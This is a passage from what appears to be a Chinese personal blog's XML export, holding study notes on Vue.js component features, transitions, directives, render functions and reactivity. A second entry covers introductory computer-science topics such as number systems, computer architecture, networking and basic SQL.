{…}1234567891011121314151617181920212223242526272829303132333435363738&lt;div id="app"&gt; &lt;blog-content v-for="post in posts" :key="post.id" :text="post.text" :style="&#123;border: postBorderSize + 'px solid red',fontSize:postFontSize + 'px'&#125;" @boder-larger="postBorderSize += $event" @font-larger="onLargerFontSize"&gt; &lt;/blog-text&gt; &lt;/div&gt; &lt;script&gt; Vue.component('blog-content', &#123; props: ['text'], template: `&lt;div&gt; &lt;p&gt;&#123;&#123;text&#125;&#125;&lt;/p&gt; &lt;button @click="$emit('boder-larger', 2)"&gt;Border Larger&lt;/button&gt; &lt;button @click="$emit('font-larger', 5)"&gt;Font Larger&lt;/button&gt; &lt;/div&gt;` &#125;) var vm = new Vue(&#123; data: &#123; posts: [ &#123;id: 1, text: 'cnn'&#125;, &#123;id: 2, text: 'bbc'&#125;, &#123;id: 3, text: 'npr'&#125;, ], postBorderSize: 1, postFontSize: 20 &#125;, methods:&#123; onLargerFontSize(playload)&#123; this.postFontSize += playload &#125; &#125; &#125;).$mount('#app) &lt;/script&gt; 在组件上使用-v-model 123456789101112131415// 以下代码等价&lt;input type="text" v-model='searchSth'&gt;&lt;input type="text" :value="searchSth" @input="searchSth=$event.target.value"&gt;// 在父组件中&lt;custom-input :value="searchSth" @input="searchSth=$event"&gt;&lt;/custom-input&gt;// 子组件input要点：将其 value 特性绑定到一个名叫value 的 prop 上； 在其input 事件被触发时，将新的值通过自定义的input事件抛出.Vue.component('custom-input',&#123; props: ['value'], template: `&lt;input :value="value" @input="$emit('input', $event.target.value)" /&gt;`&#125;)// 之后，就可以使用v-model了&lt;custom-input v-model="searchSth"&gt;&lt;/custom-input&gt; 通过插槽 slot 分发内容 1234567891011// 和 HTML 元素一样，我们经常需要向一个组件传递内容，像这样：&lt;my-component&gt; welcome my blog &lt;/my-component&gt;Vue.component('my-component',&#123; props: ['value'], template: `&lt;div&gt; &lt;p&gt; hey man &lt;/p&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/div&gt;`&#125;) 动态组件在不同组件之间进行动态切换,可以通过 Vue 的 component 元素加一个特殊的 is 特性来实现： 12// 组件会在 `currentTab` 改变时改变 &lt;component v-bind:is="currentTab"&gt;&lt;/component&gt; 解析 DOM 模板时的注意事项有些HTML元素，诸如 ul、ol、table 和 select，对于内部子元素有严格限制的。而有些元素诸如 li、tr 和 option，也只能出现在其它某些特定的元素内部。如 123&lt;table&gt; &lt;my-post&gt;&lt;/my-post&gt;&lt;/table&gt; 这个自定义组件 my-post 会被作为无效的内容提升到外部，并导致最终渲染结果出错。可以使用特殊的 is 特性：123&lt;table&gt; &lt;tr is="my-post"&gt;&lt;/tr&gt;&lt;/table&gt; 但如果我们从以下来源使用模板的话，这条限制是不存在的：字符串 (例如：template: ‘…’)、单文件组件 (.vue)、script type=”text/x-template” 组件名大小写在单文件组件和字符串模板中组件名应该总是 PascalCase 的，但是在 DOM 模板中总是 kebab-case 的。 使用 kebab-case：当使用 kebab-case (短横线分隔命名) 定义一个组件时，你也必须在引用这个自定义元素时使用 kebab-case，例如 my-component-name。 使用 PascalCase: 当使用 PascalCase (首字母大写命名) 定义一个组件时，你在引用这个自定义元素时两种命名法都可以使用。也就是说 my-component-name 和 MyComponentName 都是可接受的。但直接在 DOM (即非字符串的模板) 中使用时,由于 HTML 是大小写不敏感的,只有 kebab-case 是有效的。 Prop 名大小写在声明 prop 的时候，其命名应该始终使用 camelCase，而在模板和 JSX 中应该始终使用 kebab-case。 根据语言规范，在 JavaScript 中更自然的是 camelCase，而在 HTML 中则是 kebab-case。 HTML 中的特性名是大小写不敏感的，所以浏览器会把所有大写字符解释为小写字符。这意味着当你使用 DOM 中的模板时，camelCase (驼峰命名法) 的 prop 名需要使用其等价的 kebab-case (短横线分隔命名) 命名，但如果使用字符串模板，那么这个限制就不存在了。 包含该 prop 没有值的情况在内，都意味着true1&lt;blog-post is-published&gt;&lt;/blog-post&gt; 即便数组是静态的，我们仍然需要 v-bind 来告诉 Vue, 这是一个 JavaScript 表达式而不是一个字符串1&lt;blog-post v-bind:comment-ids="[234, 266, 273]"&gt;&lt;/blog-post&gt; 将一个对象的所有属性都作为 prop 传入，可以使用不带参数的 v-bind (取代 v-bind:prop-name)1234// 以下两种等价&lt;blog-post v-bind="post"&gt;&lt;/blog-post&gt; &lt;blog-post v-bind:id="post.id" v-bind:title="post.title"&gt;&lt;/blog-post&gt; 禁用特性继承默认情况下父作用域的不被认作 props 的特性绑定 (attribute bindings) 将会“回退”且作为普通的 HTML 特性应用在子组件的根元素上。inheritAttrs 设置为false控制去掉vue对非prop特性默认行为, $attrs 存储非prop特性。 自定义事件不同于组件和 prop，事件名不会被用作一个 JavaScript 变量名或属性名，不存在任何自动化的大小写转换。而是触发的事件名需要完全匹配监听这个事件所用的名称。因此事件名所以就没有理由使用 camelCase 或 PascalCase 了，并且 v-on 事件监听器在 DOM 模板中会被自动转换为全小写 (因为 HTML 是大小写不敏感的)，所以 v-on:myEvent 将会变成 v-on:myevent，导致 myEvent 不可能被监听到。因此，我们推荐你始终使用 kebab-case 的事件名。 keep-alive包裹动态组件时，主要用于保留组件状态或避免重新渲染，缓存不活动的组件实例，而不是销毁它们。和 transition 相似，keep-alive&gt;是一个抽象组件：它自身不会渲染一个 DOM 元素，也不会出现在父组件链中。当组件在 keep-alive内被切换，它的 activated 和 deactivated 这两个生命周期钩子函数将会被对应执行。用在其一个直属的子组件被开关的情形。如果你在其中有 v-for 则不会工作。不会在函数式组件中正常工作，因为它们没有缓存实例。props: include、exclude、max 处理边界情况访问根实例: this.$root访问父级组件实例: this.$parent访问子组件实例或子元素: this.$refs，在组件渲染完成之后生效，并且它们不是响应式的依赖注入： provide 选项允许指定想要提供给后代组件的数据/方法；然后在任何后代组件里，都可以使用 inject 选项来接收指定的想要添加在这个实例上的属性。这对选项需要一起使用，以允许一个祖先组件向其所有子孙后代注入一个依赖，不论组件层次有多深，并在起上下游关系成立的时间里始终生效。 过渡 动画过渡的类名：v-enter、v-enter-active、v-enter-to、v-leave、v-leave-active、v-leave-to。 v-enter-active 和 v-leave-active 可以控制过渡的过程时间，延迟和曲线函数。 自定义过渡的类名：enter-class、enter-active-class、enter-to-class、leave-class、leave-active-class、leave-to-class。优先级高于普通的类名，这对于 Vue 的过渡系统和其他第三方 CSS 动画库，如 Animate.css 结合使用十分有用。 显性的过渡持续时间：用 transition 组件上的 duration 属性定制一个显性的过渡持续时间 (以毫秒计)，如transition :duration=”{ enter: 500, leave: 800 }” 在属性中声明JavaScript-钩子：1234567891011121314151617181920212223242526&lt;transition v-on:before-enter="beforeEnter" v-on:enter="enter" v-on:after-enter="afterEnter" v-on:enter-cancelled="enterCancelled" v-on:before-leave="beforeLeave" v-on:leave="leave" v-on:after-leave="afterLeave" v-on:leave-cancelled="leaveCancelled"&gt; &lt;!-- ... --&gt;&lt;/transition&gt;methods: &#123; beforeEnter: function (el) &#123; // ... &#125;, // 当与 CSS 结合使用时 回调函数 done 是可选的 enter: function (el, done) &#123; // ... done() &#125;&#125; 当只用 JavaScript 过渡的时候，在 enter 和 leave 中必须使用 done 进行回调。否则，它们将被同步调用，过渡会立即完成。推荐对于仅使用 JavaScript 过渡的元素添加 v-bind:css=”false”，Vue 会跳过 CSS 的检测。这也可以避免过渡过程中 CSS 的影响。 初始渲染的过渡：通过 appear 特性设置节点在初始渲染的过渡 过渡模式：transition name=”fade” mode=”out-in”in-out：新元素先进行过渡，完成之后当前元素过渡离开。 out-in：当前元素先进行过渡，完成之后新元素过渡进入。 多个组件的过渡：不需要使用 key 特性。相反，我们只需要使用动态组件 component v-bind:is=”view” 列表过渡：使用 transition-group 组件，不同于 transition，它会以一个真实元素呈现，默认为一个 span。你也可以通过 tag 特性更换为其他元素。过渡模式不可用，因为我们不再相互切换特有的元素。内部元素 总是需要 提供唯一的 key 属性值。 不仅可以进入和离开动画，还可以改变定位。要使用这个新功能只需了解新增的 v-move 特性，它会在元素的改变定位的过程中应用。可以通过 name 属性来自定义前缀，也可以通过 move-class 属性手动设置，v-move 对于设置过渡的切换时机和过渡曲线非常有用。 状态过渡Vue 的过渡系统提供了非常多简单的方法设置进入、离开和列表的动效。那么对于数据元素本身的动效呢，比如：数字和运算、颜色的显示、SVG 节点的位置、元素的大小和其他的属性。这些数据要么本身就以数值形式存储，要么可以转换为数值。有了这些数值后，我们就可以结合 Vue 的响应式和组件系统，使用第三方库来实现切换元素的过渡状态。 可复用性 &amp; 组合 混入 mixins一种分发 Vue 组件中可复用功能的非常灵活的方式。混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被混入该组件本身的选项。同名钩子函数将混合为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子之前调用。123456let vm = new Vue(&#123; data:&#123; msg: 'hi', &#125;, mixins: [myMixin]&#125;).$mount('#app') Vue.mixin({}) 也可以全局注册混入对象。一旦使用全局混入对象，将会影响到 所有 之后创建的 Vue 实例。使用恰当时，可以为自定义对象注入处理逻辑。 自定义指令 directive除了核心功能默认内置的指令 (v-model 和 v-show)，Vue 也允许注册自定义指令。代码复用和抽象的主要形式是组件。然而，有的情况下，你仍然需要对普通 DOM 元素进行底层操作，这时候就会用到自定义指令。举个聚焦输入框的例子，如下：1234567891011121314151617// 全局指令Vue.directive('focus', &#123; inserted: function (el) &#123; el.focus() &#125;&#125;)//局部指令directives:&#123; focus: &#123; inserted: function (el) &#123; el.focus() &#125; &#125;&#125;&lt;input v-focus type="text"&gt; 钩子函数，一个指令定义对象可以提供如下几个钩子函数 (均为可选)：bind：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置。inserted：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。update：所在组件的 VNode 更新时调用，但是可能发生在其子 VNode 更新之前。指令的值可能发生了改变，也可能没有。componentUpdated：指令所在组件的 VNode 及其子 VNode 全部更新后调用。unbind：只调用一次，指令与元素解绑时调用。 钩子函数参数 除了 el 之外，其它参数都应该是只读的，切勿进行修改。如果需要在钩子之间共享数据，建议通过元素的 dataset 来进行。el：指令所绑定的元素，可以用来直接操作 DOM 。vnode：Vue 编译生成的虚拟节点。移步 VNode API 来了解更多详情。oldVnode：上一个虚拟节点，仅在 update 和 componentUpdated 钩子中可用。binding：一个对象，包含以下属性：name：指令名，不包括 v- 前缀。value：指令的绑定值，例如：v-my-directive=”1 + 1” 中，绑定值为 2。oldValue：指令绑定的前一个值，仅在 update 和 componentUpdated 钩子中可用。无论值是否改变都可用。expression：字符串形式的指令表达式。例如 v-my-directive=”1 + 1” 中，表达式为 “1 + 1”。arg：传给指令的参数，可选。例如 v-my-directive:foo 中，参数为 “foo”。modifiers：一个包含修饰符的对象。例如：v-my-directive.foo.bar 中，修饰符对象为 { foo: true, bar: true }。 渲染函数 &amp; JSXVue 推荐在绝大多数情况下使用 template 来创建HTML。然而在一些场景中，需要 JavaScript 的完全编程的能力，这时你可以用 render 函数，它比 template 更接近编译器。1234567891011121314Vue.component('anchored-heading', &#123; render: function (createElement) &#123; return createElement( 'h'+ this.level, this.$slots.default ) &#125;, props:&#123; level:&#123; type: Number, required: true &#125; &#125;&#125;) 虚拟 DOMVue 通过建立一个虚拟 DOM 对真实 DOM 发生的变化保持追踪。createElement 到底会返回什么呢？其实不是一个实际的 DOM 元素。它更准确的名字可能是 createNodeDescription，因为它所包含的信息会告诉 Vue 页面上需要渲染什么样的节点，及其子节点。我们把这样的节点描述为“虚拟节点 (Virtual Node)”，也常简写它为“VNode”。“虚拟 DOM”是我们对由 Vue 组件树建立起来的整个 VNode 树的称呼。 createElement 参数 123456789101112131415161718192021// @returns &#123;VNode&#125;createElement( // &#123;String | Object | Function&#125; 一个 HTML 标签字符串，组件选项对象，或者解析上述任何一种的一个 async 异步函数。必需参数。 'div', // &#123;Object&#125; 一个包含模板相关属性的数据对象，你可以在 template 中使用这些特性。可选参数。 &#123; // (详情见下一节) &#125;, // &#123;String | Array&#125; 子虚拟节点 (VNodes)，由 `createElement()` 构建而成，也可以使用字符串来生成“文本虚拟节点”。可选参数。 [ '先写一些文字', createElement('h1', '一则头条'), createElement(MyComponent, &#123; props: &#123; someProp: 'foobar' &#125; &#125;) ]) 深入 data 对象12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&#123; // 和`v-bind:class`一样的 API，接收一个字符串、对象或字符串和对象组成的数组 'class': &#123; foo: true, bar: false &#125;, // 和`v-bind:style`一样的 API，接收一个字符串、对象或对象组成的数组 style: &#123; color: 'red', fontSize: '14px' &#125;, // 普通的 HTML 特性 attrs: &#123; id: 'foo' &#125;, // 组件 props props: &#123; myProp: 'bar' &#125;, // DOM 属性 domProps: &#123; innerHTML: 'baz' &#125;, // 事件监听器基于 `on`，所以不再支持如 `v-on:keyup.enter` 修饰器，需要手动匹配 keyCode。 on: &#123; click: this.clickHandler &#125;, // 仅用于组件，用于监听原生事件，而不是组件内部使用，`vm.$emit` 触发的事件。 nativeOn: &#123; click: this.nativeClickHandler &#125;, // 自定义指令。注意，你无法对 `binding` 中的 `oldValue`赋值，因为 Vue 已经自动为你进行了同步。 directives: [ &#123; name: 'my-custom-directive', value: '2', expression: '1 + 1', arg: 'foo', modifiers: &#123; bar: true &#125; &#125; ], // 作用域插槽格式 &#123; name: props =&gt; VNode | Array&lt;VNode&gt; &#125; scopedSlots: &#123; default: props =&gt; createElement('span', props.text) &#125;, // 如果组件是其他组件的子组件，需为插槽指定名称 slot: 'name-of-slot', // 其他特殊顶层属性 key: 'myKey', ref: 'myRef', // 如果你在渲染函数中向多个元素都应用了相同的 ref 名，那么 `$refs.myRef` 会变成一个数组。 refInFor: true&#125; 插槽通过 this.$slots 访问静态插槽的内容，得到的是一个 VNodes 数组：12345678render: function (createElement) &#123; // `&lt;div&gt;&lt;slot&gt;&lt;/slot&gt;&lt;/div&gt;` return createElement('div', this.$slots.default)&#125;&lt;anchored-heading message="happy 2019"&gt; this is anchored heading&lt;/anchored-heading&gt; 通过 this.$scopedSlots 访问作用域插槽，得到的是一个返回 VNodes 的函数：12345678910111213141516props: ['message'],render: function (createElement) &#123; // `&lt;div&gt;&lt;slot :text="message"&gt;&lt;/slot&gt;&lt;/div&gt;` return createElement('div', [ this.$scopedSlots.default(&#123; text: this.message &#125;) ])&#125;&lt;anchored-heading message="happy 2019"&gt; &lt;template slot-scope="props"&gt; &#123;&#123;props&#125;&#125; &lt;/template&gt;&lt;/anchored-heading&gt; 函数式组件functional 无状态 (没有响应式数据)，无实例 (没有 this 上下文)。没有管理或者监听任何传递给他的状态，也没有生命周期方法。它只是一个接收参数的函数。12345678910Vue.component('my-functional-button', &#123; functional: true, // Props 可选 props: &#123; // ... &#125;, // 为了弥补缺少的实例，提供第二个参数作为上下文 render: function (createElement, context) &#123; // 完全透明的传入任何特性、事件监听器、子结点等。 return createElement('button', context.data, context.children) &#125;&#125;) 插件插件通常会为 Vue 添加全局功能。插件的范围没有限制——一般有下面几种：种类：添加全局方法或者属性、添加全局资源：指令/过滤器/过渡等、通过全局 mixin 方法添加一些组件选项、一个库，提供自己的 API，同时提供上面提到的一个或多个功能使用插件：Vue.use(MyPlugin, { someOption: true })开发插件：Vue.js 的插件应该有一个公开方法 install。这个方法的第一个参数是 Vue 构造器，第二个参数是一个可选的选项对象：123456789101112131415161718192021222324252627MyPlugin.install = function (Vue, options) &#123; // 1. 添加全局方法或属性 Vue.myGlobalMethod = function () &#123; // 逻辑... &#125; // 2. 添加全局资源 Vue.directive('my-directive', &#123; bind (el, binding, vnode, oldVnode) &#123; // 逻辑... &#125; ... &#125;) // 3. 注入组件 Vue.mixin(&#123; created: function () &#123; // 逻辑... &#125; ... &#125;) // 4. 添加实例方法 Vue.prototype.$myMethod = function (methodOptions) &#123; // 逻辑... &#125;&#125; 过滤器用于一些常见的文本格式化。过滤器可以用在两个地方：双花括号插值和 v-bind 表达式。过滤器应该被添加在 JavaScript 表达式的尾部，由“管道”符号指示：过滤器可以串联 message | filterA | filterB过滤器是 JavaScript 函数，因此可以接收参数：message | filterA(‘arg1’, arg2)，此处接收三个参数，message 的值作为第一个参数，普通字符串 ‘arg1’ 作为第二个参数，表达式 arg2 的值作为第三个参数。 路由 SPA缺点：不利于SEO; 浏览器前进后退会重新发送请求，没有合理利用缓存; 无法记住之前滚动的位置; 深入响应式原理Vue 最独特的特性之一，是其非侵入性的响应式系统。数据模型仅仅是普通的 JavaScript 对象。而当你修改它们时，视图会进行更新。这使得状态管理非常简单直接。 如何追踪变化当你把一个普通的 JavaScript 对象传给 Vue 实例的 data 选项，Vue 将遍历此对象所有的属性，并使用 Object.defineProperty(obj, prop, descriptor)把这些属性全部转为 getter/setter。Object.defineProperty 是 ES5 中一个无法 shim 的特性，这也就是为什么 Vue 不支持 IE8 以及更低版本浏览器。 每个组件实例都有相应的 watcher 实例对象，它会在组件渲染的过程中把属性记录为依赖，之后当依赖项的 setter 被调用时，会通知 watcher 重新计算，从而致使它关联的组件得以更新。 声明响应式属性：受现代 JavaScript 的限制，Vue 不能检测到对象属性的添加或删除。由于 Vue 会在初始化实例时对属性执行 getter/setter 转化过程，所以属性必须在 data 对象上存在才能让 Vue 转换它，这样才能让它是响应的。由于 Vue 不允许动态添加根级响应式属性，所以你必须在初始化实例前声明根级响应式属性，哪怕只是一个空值。 然而它可以使用 Vue.set(object, key, value) 方法将响应属性添加到嵌套的对象上，或者有时你想向一个已有对象添加多个属性，例如使用 Object.assign() 或 _.extend() 方法来添加属性。this.someObject = Object.assign({}, this.someObject, { a: 1, b: 2 }) 异步更新队列Vue 异步执行 DOM 更新。只要观察到数据变化，Vue 将开启一个队列，并缓冲在同一事件循环中发生的所有数据改变。如果同一个 watcher 被多次触发，只会被推入到队列中一次。这种在缓冲时去除重复数据对于避免不必要的计算和 DOM 操作上非常重要。然后，在下一个的事件循环“tick”中，Vue 刷新队列并执行实际 (已去重的) 工作。Vue 在内部尝试对异步队列使用原生的 Promise.then 和 MessageChannel，如果执行环境不支持，会采用 setTimeout(fn, 0) 代替。 在组件内使用 vm.$nextTick() 实例方法特别方便，因为它不需要全局 Vue ，并且回调函数中的 this 将自动绑定到当前的 Vue 实例上。 123456789methods: &#123; updateMessage: function () &#123; this.message = '更新完成' console.log(this.$el.textContent) // =&gt; '没有更新' this.$nextTick(function () &#123; console.log(this.$el.textContent) // =&gt; '更新完成' &#125;) &#125;&#125; 因为 $nextTick() 返回一个 Promise 对象，所以你可以使用新的 ES2016 async/await 语法完成相同的事情：12345678methods: &#123; async updateMessage: function () &#123; this.message = 'updated' console.log(this.$el.textContent) // =&gt; '未更新' await this.$nextTick() console.log(this.$el.textContent) // =&gt; '已更新' &#125;&#125;]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大学计算机基础]]></title>
    <url>%2F2019%2F01%2F22%2FCS%2F%E5%A4%A7%E5%AD%A6%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[大学计算机基础 主要学什么： 基础原理概念、支撑系统平台、信息处理、计算文化 计算机与问题求解：基于计算机软件、程序、系统工程（多平台、多软件、多资源） 抽象和建模：抽象，是从众多的事物中抽取出共同的、本质性的特征，而舍弃其非本质的特征。抽象是人们求解问题时的认知过程和思维方法从个别在把握一般，从现象中把握本质。抽象是形成概念的必要手段，通过抽象建立客观事物的描述模型。 建模，是为了理解事物而对其做出的一种抽象，是对事物的一种无歧义书面描述，是研究系统的重要手段和前提。凡是用模型描述系统的因果关系或相互关系的过程都属于建模。 抽象是把具体问题简化描述，建模是问题求解的精确描述，是计算的依据。 进制：（1001)₂ = 1001B 二进制 Binary（1001)₈ = 1001O = 1001Q 八进制 Octal（1001)₁₀ = 1001D 十进制 Decimal（1001)₁₆ = 1001D 十六进制 Hexadecimal 原码，反码，补码原码：一个n位的二进制数，其中最高位为符号位：正数为0，负数为1。剩下的n-1位表示该数的绝对值。反码：正数的反码是其本身。负数的反码，除符号位，按位取反(就是0变1，1变0)补码：正数的补码就是其本身。负数的反码，除符号位，按位取反，然后最后一位+1，即【取反+1】例如，X=-10 1011 , [X]原= 1010 1011 ，[X]反=1101 0100， [X]补=1101 0101使用补码不仅仅修复了0的符号以及存在两个编码的问题，还能够多表示一个最低数，所以对于编程中常用到的32位int类型可以表示范围是 [-2^31, 2^31-1] ，因为第一位表示的是符号位，而使用补码表示时又可以多保存一个最小值。 ASCII 美国信息交换标准代码American Standard Code for Information Interchange用7位编码，8位表示，最高位为00 - 0 011 0000 - 30H9 - 0 011 1001 - 39HA - 0 100 0001 - 41Ha - 0 110 0001 - 61HZ - 0 101 1010 - 5AHz - 0 111 1010 - 7AH 计算机工作原理与硬件结构CPU = ALU(算数逻辑单元 Arithmetic Logic Unit) + 寄存器(临时存储单元Cache， 分为通用寄存器和累加器)1byte 字节 = 8bit 位1 字 = 16 位1KB = 1024 B (2^10 B)1MB = 1024 KB (2^20 B)1GB = 1024 MB (2^30 B)1TB = 1024 GB (2^40 B) 机器指令CPU能直接识别并执行的指令，表现形式是二进制编码。机器指令 = 操作码（指令所要完成的操作，即指令的功能）+ 操作数（参与运算的对象，以及运算结果所存放的位置等） 指令系统是指计算机所能执行的全部指令的集合，它描述了计算机内全部的控制信息和“逻辑判断”能力。一般均包含算术运算型、逻辑运算型、数据传送型、判定和控制型、移位操作型、位（位串）操作型、输入和输出型等指令。指令系统是表征一台计算机性能的重要因素，它的格式与功能不仅直接影响到机器的硬件结构，而且也直接影响到系统软件，影响到机器的适用范围. 冯诺依曼体系 John Von· Neumann 1946年美籍匈牙利科学核心思想: 数字计算机的数制采用二进制；计算机应该按照程序顺序执行 必须具有如下功能：把需要的程序和数据送至计算机中。必须具有长期记忆程序、数据、中间结果及最终运算结果的能力。能够完成各种算术运算、逻辑运算和数据传送等数据加工处理的能力。能够根据需要控制程序走向，并能根据指令控制机器的各部件协调操作。能够按照要求将处理结果输出给用户。 五大基本组成部件：运算器：用于完成各种算术运算、逻辑运算和数据传送等数据加工处理。控制器：用于控制程序的执行，是计算机的大脑。运算器和控制器组成计算机的中央处理器（CPU）。控制器根据存放在存储器中的指令序列（程序）进行工作，并由一个程序计数器控制指令的执行。控制器具有判断能力，能根据计算结果选择不同的工作流程。存储器：用于记忆程序和数据，例如：内存。程序和数据以二进制代码形式不加区别地存放在存储器中，存放位置由地址确定。输入设备：用于将数据或程序输入到计算机中，例如：鼠标、键盘。输出设备：将数据或程序的处理结果展示给用户，例如：显示器、打印机。 图灵机 艾伦·麦席森·图灵（Alan Mathison Turing) 1912年 英国数学家所谓的图灵机就是指一个抽象的机器逻辑结构上图灵机有四个部分组成：一个无限长的存储带，带子有一个个连续的存储格子组成，每个格子可以存储一个数字或符号。一个读写头，读写头可以在存储带上左右移动，并可以读、修改存储格上的数字或符号。内部状态存储器，该存储器可以记录图灵机的当前状态，并且有一种特殊状态为停机状态。控制程序指令，指令可以根据当前状态以及当前读写头所指的格子上的符号来确定读写头下一步的动作（左移还是右移），并改变状态存储器的值，令机器进入一个新的状态或保持状态不变。 操作系统 OS operating system（计算机管理控制程序）管理计算机硬件与软件资源的计算机程序，同时也是计算机系统的内核与基石。操作系统需要处理如管理与配置内存、决定系统资源供需的优先次序、控制输入与输出设备、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。分类：多道批处理系统、分时系统、实时系统特征：并发、共享、虚拟（把一个物理上的实体变为若干个逻辑上的对应物）、异步一个标准PC的操作系统应该提供以下的功能：进程管理（Processing management):进程是指一个具有独立功能的程序对某个数据集在处理机上的执行过程和分配资源的基本单位。程序+数据集合+进程控制块PCB内存管理（Memory management）文件系统（File system）网络通信（Networking）安全机制（Security）用户界面（User interface）驱动程序（Device drivers） 计算机网络网络：由节点和连线构成，表示诸多对象及其相互联系。特点：多点性、连结性、交互性、快速性基本功能：数据通信、资源共享、分布式处理逻辑构成：通信子网（通信控制处理机、通信线路、通信设备）+ 资源子网（主机终端附属设备、网络软件、数据资源）物理构成：硬件（主机、终端网络主体、网络通信介质、调制调解器和网络适配器和中继器 集线器和 网桥 交换机和 路由器 三层交换机 网关等网络连接设备） 、软件（网络操作系统）、网络通信协议分类：分布范围（局域网LAN、广域网WAN）；拓扑结构（总线型、星型、环形）；数据交换技术（线路交换、报文交换、分组交换） OSI（Open System Interconnect），即开放式系统互联七层模型（一个理想的模型）：物理层Physical Layer： 比特流的传输。通过媒介传输比特,确定机械及电气规范（比特Bit）数据链路层Data Link Layer: 介质访问接入。将比特组装成帧和点到点的传递（帧Frame）网络层Network Layer，即IP协议层：路由寻址。负责数据包从源到宿的传递和网际互连（包PackeT）传输层Transport Layer：端到端的连接。提供端到端的可靠报文传递和错误恢复（段Segment）会话层Session Layer：主机间的通信。建立、管理和终止会话（会话协议数据单元SPDU）表示层Presentation Layer：数据的表示。对数据进行翻译、加密和压缩（表示协议数据单元PPDU）应用层Application Layer：处理网络应用。允许访问OSI环境的手段（应用协议数据单元APDU） TCP/IP五层模型物理层、数据链路层、网络层、传输层、应用层(对应OSI的会话层、表示层和应用层) TCP和UDP区别TCP协议在传送数据段的时候要给段标号；UDP协议不用TCP协议可靠，无差错，不丢失，不重复，且按序到达；UDP协议，尽最大努力交付，即不保证可靠交付TCP协议是面向连接(发送数据之前要建立连接)；UDP协议采用无连接TCP协议负载较高，采用虚电路；UDP采用无连接TCP协议的发送方要确认接收方是否收到数据段（3次握手协议）TCP协议采用窗口技术和流控制；UDP采用数据报模式TCP保证数据顺序；UDP不保证 Internet地址IP地址 = 网络地址+主机地址IPv4的地址长度为32位，共4个字节，但实际中我们用点分十进制记法。分类：分为A、B、C三类及特殊地址D、E。 全0（当前主机）和全1（广播地址,同时向同一子网所有主机发送报文）的都保留不用。不能以127（回送地址，网络软件测试以及本地机进程间通信）为开头。A类：第1位必须是0，网络号范围：1~126（0000 0001 ~ 0111 1110）， 地址范围：1.0.0.0-126.255.255.255, 默认子网掩码255.0.0.0。 一般用于大型网络。B类：前2位必须是10，网络号范围：128.1 ~ 191.255， 地址范围：128.1.0.1-191.255.255.254, 默认的子网掩码是255.255.0.0。 一般用于中等规模网络。C类：前2位必须是110，网络号范围：192.0.1 ~ 223.255.255， 地址范围：192.0.1.1-223.255.255.254, 默认的子网掩码是255.255.255.0。 一般用于小型网络。 网关:要实现两个网络之间的通信，则必须通过网关。网关设备可以是 交互机（三层及以上才能跨网络）、路由器、启用了路由协议的服务器、代理服务器、防火墙等网关地址就是网关设备的IP地址。 云计算 Cloud Computing一种按使用量付费的模式，这种模式提供可用的、便捷的、按需的网络访问， 进入可配置的计算资源共享池（资源包括网络，服务器，存储，应用软件，服务），这些资源能够被快速提供，只需投入很少的管理工作，或与服务供应商进行很少的交互。体系架构：云用户端、服务目录、管理系统和部署工具、资源监控、服务器集群服务形式：IaaS：基础设施即服务，PaaS：平台即服务，SaaS：软件即服务 物联网 Internet of things（IoT）物物相连的互联网。这有两层意思：其一，物联网的核心和基础仍然是互联网，是在互联网基础上的延伸和扩展的网络；其二，其用户端延伸和扩展到了任何物品与物品之间，进行信息交换和通信，也就是物物相息。 数据处理与数据库最小的基本单位是bit，按顺序给出所有单位：bit比特、Byte字节、KB、MB、GB、TB、PB、EB、ZB、YB、BB、NB、DB。 大数据 Big data指无法在一定时间范围内用常规软件工具进行捕捉、管理和处理的数据集合，是需要新处理模式才能具有更强的决策力、洞察发现力和流程优化能力的海量、高增长率和多样化的信息资产。5V特点（IBM提出）：Volume（大量）、Velocity（高速）、Variety（多样）、Value（低价值密度）、Veracity（真实性）主要技术点：云计算、分布式处理技术、存储技术和感知技术的发展来说明大数据从采集、处理、存储到形成结果的整个过程 数据中心和数据空间数据中心datacenter 一整套复杂的设施。它不仅仅包括计算机系统和其它与之配套的设备（例如通信和存储系统），还包含冗余的数据通信连接、环境控制设备、监控设备以及各种安全装置数据空间dataspace 是与主体相关的数据及其关系的集合，数据空间中的所有数据对于主体来说都是可以控制的。主体相关性和可控性是数据空间中数据项的基本属性。 多媒体媒体：承载信息的载体。分为两类：存储信息的实体（磁带、磁盘）和信息载体（数字、文本、文字、声音、图形、图像、动画、视频）。 数据库按照一定的结构来存放数据的”仓库”表：由行和列构成，若干记录的集合，是若干数据项构成的，一种关系表示一张表字段：表格的列表示实体的某个属性记录：表格的一行包含多个字段，也称为元祖域：属性的取值范围关键字：凡在表中能唯一确定不同记录的字段或字段组合 笛卡尔积：设A、B为集合，用A中元素为第一元素，B中元素为第二元素，构成有序对，所有这样的有序对组成的集合叫做A与B的笛卡尔积 SQL Structured Query Language是用于访问和处理数据库的标准的计算机语言。一定要记住，SQL 对大小写不敏感！ SELECT DISTINCT 列名称 FROM 表名称SELECT DISTINCT Company FROM Orders SELECT 列名称 FROM 表名称 WHERE 列 运算符 值SELECT * FROM Persons WHERE FirstName=’Bush’ INSERT INTO 表名称 VALUES (值1, 值2,….)INSERT INTO table_name (列1, 列2,…) VALUES (值1, 值2,….)INSERT INTO Persons (LastName, Address) VALUES (‘Wilson’, ‘Champs-Elysees’) UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值UPDATE Person SET Address = ‘Zhongshan 23’, City = ‘Nanjing’ WHERE LastName = ‘Wilson’ DELETE FROM 表名称 WHERE 列名称 = 值DELETE FROM Person WHERE LastName = ‘Wilson’ 计算科学三大科学思维：理论思维（推理思维），以推理和演绎为特征，如数学实验思维（实证思维），观察和总结客观规律，如化学计算思维（构造思维），设计和构造，如计算机科学 